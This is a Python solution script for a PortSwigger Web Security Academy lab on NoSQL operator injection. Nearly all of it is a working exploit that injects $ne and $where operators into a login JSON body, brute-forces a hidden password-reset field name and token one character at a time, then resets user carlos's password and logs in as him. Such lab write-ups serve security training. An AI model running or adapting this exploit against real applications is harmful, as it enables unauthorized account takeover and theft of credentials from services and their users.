#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 6/10/2023
#
# Lab: Exploiting NoSQL operator injection to extract unknown fields
#
# Steps: 1. Fetch the forgot-password page
#        2. Extract csrf token and session cookie
#        3. Make a forgot-password request for carlos
#        4. Inject an operator and payload into the login JSON object to determine
#           the length of the unknown field name
#        5. Modify the payload to brute force the field name
#        6. Modify the payload to determine the length of the field value
#        7. Modify the payload to brute force the field value
#        8. Fetch the forgot-password page with the field name and its value
#           as a query pararmeter
#        9. Extract csrf token and session cookie
#        10. Make a reset password request for carlos
#        11. Login as carlos with the new password
#        12. Fetch the carlos profile
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########################################
# Function to determine password length
#########################################
def determin_length(url, field_name):

    # some output formatting based on which step you are in
    match field_name:
            case "":
                pass
            case _:
                print("")
    
    for length in range(1, 50):

        # set the payload based on which step you are in
        # "" means that you determine the length of the field name
        # _ means that you determine the length of the field value
        match field_name:
            case "":
                print(Fore.WHITE + "⦗4⦘ Checking if field number " + Fore.BLUE + "3" + Fore.WHITE + " length = " + Fore.YELLOW + str(length), flush=True, end='\r')

                # payload to determine password length
                payload = {
                    "username": "carlos",
                    "password": {
                        "$ne": ""
                    },
                    "$where": f"Object.keys(this)[3].length == {length}"
                }
            
            case _:
                print(Fore.WHITE + "⦗6⦘ Checking if the field " + Fore.BLUE + field_name + Fore.WHITE + " length = " + Fore.YELLOW + str(length), flush=True, end='\r')

                # payload to determine password length
                payload = {
                    "username": "carlos",
                    "password": {
                        "$ne": ""
                    },
                    "$where": f"this.{field_name}.length == {length}"
                }

        try:
            # fetch the page with the injected payload
            injection = requests.post(f"{url}/login", json=payload)
            # print(injection.text)
            
        except:
            print(Fore.RED + "[!] Failed to inject the payload to determine the password length through exception")
            continue

        # extract the error text
        error_text = re.findall("Invalid username or password", injection.text)

        # if the error message is not returned in the response
        if len(error_text) == 0:
            # print information based on which step you are in
            # "" means that you determine the length of the field name
            # _ means that you determine the length of the field value
            match field_name:
                case "":
                    print(Fore.WHITE + "⦗4⦘ Checking if field number " + Fore.BLUE + "3" + Fore.WHITE + " length = " +
                            Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " +
                            Fore.GREEN + str(length) + Fore.WHITE + " ]")
                
                case _:
                    print(Fore.WHITE + "⦗6⦘ Checking if the field " + Fore.BLUE + field_name + Fore.WHITE + " length = " +
                            Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " +
                            Fore.GREEN + str(length) + Fore.WHITE + " ]")
                    
            # return the correct length
            return length
        
        else:
            continue
    
    # if the correct length not in between 1 and 50
    return None


#####################################
# Function to brute force password
#####################################
def brute_force(url, password_length, field_name):
    # list that will hold the correct chars
    correct_password = []

    for position in range(0, password_length):
        # iterate over possible chars
        for character in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":

            # set the payload based on which step you are in
            # "" means that you determine the length of the field name
            # _ means that you determine the length of the field value
            match field_name:
                case "":
                    print(Fore.WHITE + "⦗5⦘ Checking if the char of field number " + Fore.BLUE + "3" + Fore.WHITE + " at position " +
                        Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
                    
                    # payload to determine password length
                    payload = {
                        "username": "carlos",
                        "password": {
                            "$ne": ""
                        },
                        "$where": f"Object.keys(this)[3][{position}] == '{character}'"
                    }
                
                case _:
                    print(Fore.WHITE + "⦗7⦘ Checking if the char of " + Fore.BLUE + field_name + Fore.WHITE + " at position " +
                    Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')

                    # payload to determine password length
                    payload = {
                        "username": "carlos",
                        "password": {
                            "$ne": ""
                        },
                        "$where": f"this.{field_name}[{position}] == '{character}'"
                    }
                    
            try:
                # fetch the page with the injected payload
                injection = requests.post(f"{url}/login", json=payload)
                
            except:
                print(Fore.RED + "[!] Failed to inject the payload while brute forcing administrator's password through exception")
                continue
            
            # extract the welcome text
            error_text = re.findall("Invalid username or password", injection.text)
            
            # if the error message is not returned in the response
            if len(error_text) == 0:
                # append the character at the end of the correct password variable
                correct_password.append(character)
                
                # print information based on which step you are in
                # "" means that you determine the length of the field name
                # _ means that you determine the length of the field value
                match field_name:
                    case "":
                        print(Fore.WHITE + "⦗5⦘ Checking if the char of field number " + Fore.BLUE + "3" + Fore.WHITE + " at position " +
                                Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " +
                                Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')
                    
                    case _:
                        print(Fore.WHITE + "⦗7⦘ Checking if the char of " + Fore.BLUE + field_name + Fore.WHITE + " at position " +
                                Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " +
                                Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')

                break
            
            else:
                continue
    
    # convert the list of valid character to a string and return it
    return "".join(correct_password)


#########
# Main
#########

# change this to your lab URL
url = "https://0ae400db0396cbb5830f247500e600ab.web-security-academy.net"

print(Fore.BLUE + "⟪#⟫ Injection parameter: " + Fore.YELLOW + "login JSON object")

try:  
    # fetch forgot-password page
    fetch_forgot_password = requests.get(f"{url}/forgot-password")

except:
    print(Fore.RED + "[!] Failed to fetch forgot-password page through exception")
    exit(1)

print(Fore.WHITE + "⦗1⦘ Fetching the forgot-password page.. " + Fore.GREEN + "OK")

# get session cookie
session = fetch_forgot_password.cookies.get("session")

# extract csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", fetch_forgot_password.content.decode())[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "carlos",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:  
    # send a request to reset carlos password
    reset_carlos_password = requests.post(f"{url}/forgot-password", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to send a request to reset carlos password through exception")
    exit(1)

print( Fore.WHITE + "⦗3⦘ Sending a reset password request for carlos.. " + Fore.GREEN + "OK")

# determine the 3rd field length
field_name_length = determin_length(url, "")

# brute force the 3rd field name
field_name = brute_force(url, field_name_length, "")

# determine the field value length
field_value_length = determin_length(url, field_name)

# brute force the field value
field_value = brute_force(url, field_value_length, field_name)

try:  
    # fetch forgot-password page with the field name and its value as a query pararmter
    forgot_password = requests.get(f"{url}/forgot-password?{field_name}={field_value}")

except:
    print(Fore.RED + "[!] Failed to fetch forgot-password page with the field name and its value as a query pararmter through exception")
    exit(1)

print(Fore.WHITE + "\n⦗8⦘ Fetching the forgot-password page with the field name and its value as a query pararmter.. " + Fore.GREEN + "OK")

# get session cookie
session = forgot_password.cookies.get("session")

# extract csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", forgot_password.content.decode())[0]

print(Fore.WHITE + "⦗9⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

# set new password
# change this to what you want
new_password = "hacked"

# data to send via POST
data = {
    "username": "carlos",
    "csrf": csrf,
    field_name: field_value,
    "new-password-1" : new_password,
    "new-password-2" : new_password
}

# set session cookie
cookies = {
    "session": session
}

try:  
    # reset carlos password
    reset_carlos_password = requests.post(f"{url}/forgot-password", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to reset carlos password through exception")
    exit(1)

print(Fore.WHITE + "⦗10⦘ Reseting carlos password to " + Fore.BLUE + new_password + Fore.WHITE +  ".. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "username": "carlos",
    "password": new_password
}

try:  
    # login as carlos
    login = requests.post(f"{url}/login", json=data, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as carlos through exception")
    exit(1)

print(Fore.WHITE + "⦗11⦘ Logging in as the carlos.. " + Fore.GREEN + "OK")

# get session cookie
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch carlos profile
    carlos = requests.get(f"{url}/my-account", cookies=cookies)

except:
    print(Fore.RED + "[!] Failed to fetch carlos profile through exception")
    exit(1)

print(Fore.WHITE + "⦗12⦘ Fetching the carlos profile.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")




